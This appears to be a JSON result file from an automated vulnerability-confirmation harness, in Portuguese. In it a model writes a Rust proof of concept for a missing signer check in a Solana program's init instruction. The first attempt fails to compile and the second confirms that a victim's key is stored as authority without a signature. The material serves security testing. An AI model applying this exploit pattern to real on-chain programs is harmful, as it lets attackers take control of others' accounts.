@@ -1,0 +1,135 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: config gravou a chave da vitima como autoridade sem que ela assinasse",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2301,
+        "completion_tokens": 627,
+        "latency_s": 3.69
+      },
+      "raw": "{\n  \"plan\": \"O programa `init` (Pinocchio) grava a chave de `accounts[1]` como autoridade da config sem verificar `is_signer`. O baseline usa a instrucao `init` com a autoridade legitima assinando, provando que o cenario esta montado corretamente. O ataque repete a mesma chamada, mas com a chave da autoridade vitima em `accounts[1]` sem assinar. O efeito mede que a autoridade gravada na config e a chave da vitima, demonstrando que o atacante assumiu o controle sem a assinatura da autoridade.\",\n  \"scenario\": \"let config_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet config_data = vec![0u8; 49];\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet baseline_ix = env.raw_ix(\\n    &[0u8],\\n    &[\\n        AccountMeta::new(config_key, true),\\n        AccountMeta::new_readonly(authority_key, true),\\n    ],\\n);\\nlet baseline_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (authority_key, wallet(1_000_000)),\\n];\\nlet baseline_result = env.baseline(\\\"init legitimo com autoridade assinando\\\", &baseline_ix, &baseline_accounts);\\n\\nlet victim_key = Pubkey::new_unique();\\nlet attack_config_key = Pubkey::new_unique();\\nlet attack_config_data = vec![0u8; 49];\\nlet attack_config_account = account(&env.program_id, &attack_config_data, None);\\n\\nlet attack_ix = env.raw_ix(\\n    &[0u8],\\n    &[\\n        AccountMeta::new(attack_config_key, true),\\n        AccountMeta::new_readonly(victim_key, false),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (attack_config_key, attack_config_account),\\n    (victim_key, wallet(1_000_000)),\\n];\\nlet attack_result = env.attack(\\\"init grava autoridade vitima sem assinatura\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let stored_authority = read_pubkey(after(&attack_result, &attack_config_key).data(), 8);\\n    env.effect(\\n        \\\"config gravou a chave da vitima como autoridade sem que ela assinasse\\\",\\n        stored_authority == victim_key,\\n    );\\n}\"\n}",
+      "plan": "O programa `init` (Pinocchio) grava a chave de `accounts[1]` como autoridade da config sem verificar `is_signer`. O baseline usa a instrucao `init` com a autoridade legitima assinando, provando que o cenario esta montado corretamente. O ataque repete a mesma chamada, mas com a chave da autoridade vitima em `accounts[1]` sem assinar. O efeito mede que a autoridade gravada na config e a chave da vitima, demonstrando que o atacante assumiu o controle sem a assinatura da autoridade.",
+      "scenario": "let config_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet config_data = vec![0u8; 49];\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet baseline_ix = env.raw_ix(\n    &[0u8],\n    &[\n        AccountMeta::new(config_key, true),\n        AccountMeta::new_readonly(authority_key, true),\n    ],\n);\nlet baseline_accounts = vec![\n    (config_key, config_account.clone()),\n    (authority_key, wallet(1_000_000)),\n];\nlet baseline_result = env.baseline(\"init legitimo com autoridade assinando\", &baseline_ix, &baseline_accounts);\n\nlet victim_key = Pubkey::new_unique();\nlet attack_config_key = Pubkey::new_unique();\nlet attack_config_data = vec![0u8; 49];\nlet attack_config_account = account(&env.program_id, &attack_config_data, None);\n\nlet attack_ix = env.raw_ix(\n    &[0u8],\n    &[\n        AccountMeta::new(attack_config_key, true),\n        AccountMeta::new_readonly(victim_key, false),\n    ],\n);\nlet attack_accounts = vec![\n    (attack_config_key, attack_config_account),\n    (victim_key, wallet(1_000_000)),\n];\nlet attack_result = env.attack(\"init grava autoridade vitima sem assinatura\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let stored_authority = read_pubkey(after(&attack_result, &attack_config_key).data(), 8);\n    env.effect(\n        \"config gravou a chave da vitima como autoridade sem que ela assinasse\",\n        stored_authority == victim_key,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:17:9\n    |\n 15 |       let baseline_ix = env.raw_ix(\n    |                             ------ arguments to this method are incorrect\n 16 |           &[0u8],\n 17 | /         &[\n 18 | |             AccountMeta::new(config_key, true),\n 19 | |             AccountMeta::new_readonly(authority_key, true),\n 20 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:35:9\n    |\n 33 |       let attack_ix = env.raw_ix(\n    |                           ------ arguments to this method are incorrect\n 34 |           &[0u8],\n 35 | /         &[\n 36 | |             AccountMeta::new(attack_config_key, true),\n 37 | |             AccountMeta::new_readonly(victim_key, false),\n 38 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:17:9\n    |\n 15 |       let baseline_ix = env.raw_ix(\n    |                             ------ arguments to this method are incorrect\n 16 |           &[0u8],\n 17 | /         &[\n 18 | |             AccountMeta::new(config_key, true),\n 19 | |             AccountMeta::new_readonly(authority_key, true),\n 20 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:35:9\n    |\n 33 |       let attack_ix = env.raw_ix(\n    |                           ------ arguments to this method are incorrect\n 34 |           &[0u8],\n 35 | /         &[\n 36 | |             AccountMeta::new(attack_config_key, true),\n 37 | |             AccountMeta::new_readonly(victim_key, false),\n 38 | |         ],\n    | |_________^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3049,
+        "completion_tokens": 575,
+        "latency_s": 3.22
+      },
+      "raw": "{\"plan\": \"Preparo uma conta config com 49 bytes de dados pertencente ao programa e uma conta authority. No baseline, chamo init com a authority assinando (uso legitimo). No ataque, chamo init com a chave de uma vitima como accounts[1] sem que ela assine, e verifico se a chave da vitima foi gravada como autoridade nos bytes 8..40 da config.\", \"scenario\": \"let config_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet config_data = vec![0u8; 49];\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet baseline_ix = env.raw_ix(\\n    &[0u8],\\n    vec![\\n        AccountMeta::new(config_key, true),\\n        AccountMeta::new_readonly(authority_key, true),\\n    ],\\n);\\nlet baseline_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (authority_key, wallet(1_000_000)),\\n];\\nlet baseline_result = env.baseline(\\\"init legitimo com autoridade assinando\\\", &baseline_ix, &baseline_accounts);\\n\\nlet victim_key = Pubkey::new_unique();\\nlet attack_config_key = Pubkey::new_unique();\\nlet attack_config_data = vec![0u8; 49];\\nlet attack_config_account = account(&env.program_id, &attack_config_data, None);\\n\\nlet attack_ix = env.raw_ix(\\n    &[0u8],\\n    vec![\\n        AccountMeta::new(attack_config_key, true),\\n        AccountMeta::new_readonly(victim_key, false),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (attack_config_key, attack_config_account),\\n    (victim_key, wallet(1_000_000)),\\n];\\nlet attack_result = env.attack(\\\"init grava autoridade vitima sem assinatura\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let stored_authority = read_pubkey(after(&attack_result, &attack_config_key).data(), 8);\\n    env.effect(\\n        \\\"config gravou a chave da vitima como autoridade sem que ela assinasse\\\",\\n        stored_authority == victim_key,\\n    );\\n}\"}",
+      "plan": "Preparo uma conta config com 49 bytes de dados pertencente ao programa e uma conta authority. No baseline, chamo init com a authority assinando (uso legitimo). No ataque, chamo init com a chave de uma vitima como accounts[1] sem que ela assine, e verifico se a chave da vitima foi gravada como autoridade nos bytes 8..40 da config.",
+      "scenario": "let config_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet config_data = vec![0u8; 49];\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet baseline_ix = env.raw_ix(\n    &[0u8],\n    vec![\n        AccountMeta::new(config_key, true),\n        AccountMeta::new_readonly(authority_key, true),\n    ],\n);\nlet baseline_accounts = vec![\n    (config_key, config_account.clone()),\n    (authority_key, wallet(1_000_000)),\n];\nlet baseline_result = env.baseline(\"init legitimo com autoridade assinando\", &baseline_ix, &baseline_accounts);\n\nlet victim_key = Pubkey::new_unique();\nlet attack_config_key = Pubkey::new_unique();\nlet attack_config_data = vec![0u8; 49];\nlet attack_config_account = account(&env.program_id, &attack_config_data, None);\n\nlet attack_ix = env.raw_ix(\n    &[0u8],\n    vec![\n        AccountMeta::new(attack_config_key, true),\n        AccountMeta::new_readonly(victim_key, false),\n    ],\n);\nlet attack_accounts = vec![\n    (attack_config_key, attack_config_account),\n    (victim_key, wallet(1_000_000)),\n];\nlet attack_result = env.attack(\"init grava autoridade vitima sem assinatura\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let stored_authority = read_pubkey(after(&attack_result, &attack_config_key).data(), 8);\n    env.effect(\n        \"config gravou a chave da vitima como autoridade sem que ela assinasse\",\n        stored_authority == victim_key,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo com autoridade assinando",
+            "result": "Success",
+            "compute_units": 278,
+            "account_flags": "sw,sr",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "01020304050607080000000000000003000000000000000000000000000000000000000000000000010000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "init grava autoridade vitima sem assinatura",
+            "result": "Success",
+            "compute_units": 278,
+            "account_flags": "sw,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "01020304050607080000000000000004000000000000000000000000000000000000000000000000010000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "config gravou a chave da vitima como autoridade sem que ela assinasse",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 278 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 278 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: config gravou a chave da vitima como autoridade sem que ela assinasse"
+    }
+  ],
+  "case_id": "SSP-04-P-V",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let authority = &accounts[1];\n...\ndata[8..40].copy_from_slice(authority.key().as_ref());",
+    "explanation": "A conta `authority` e lida de `accounts[1]` como `AccountInfo` e sua chave e gravada como autoridade da config sem qualquer verificacao de `authority.is_signer`. Nao ha tipo `Signer` nem `require!(authority.is_signer, ...)`.",
+    "attack_hypothesis": "Um atacante fornece a chave publica de qualquer autoridade (por exemplo, a de uma vitima ou uma chave arbitraria) como `accounts[1]` sem assinar a transacao, gravando-a como autoridade da config e assumindo o controle da conta."
+  }
+}
